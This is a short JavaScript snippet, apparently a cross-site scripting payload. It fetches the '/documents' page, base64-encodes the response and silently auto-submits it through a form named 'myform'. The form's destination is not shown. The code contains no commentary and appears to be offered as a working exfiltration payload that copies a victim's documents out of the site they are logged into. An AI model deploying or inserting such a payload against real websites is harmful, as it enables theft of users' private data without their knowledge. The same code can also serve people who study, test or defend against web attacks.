var url = "/documents";
var xhr = new XMLHttpRequest();
xhr.open('GET', url);
xhr.onload = function() {
	document.myform.name.value=btoa(this.response);
	document.myform.submit();
}
xhr.send();
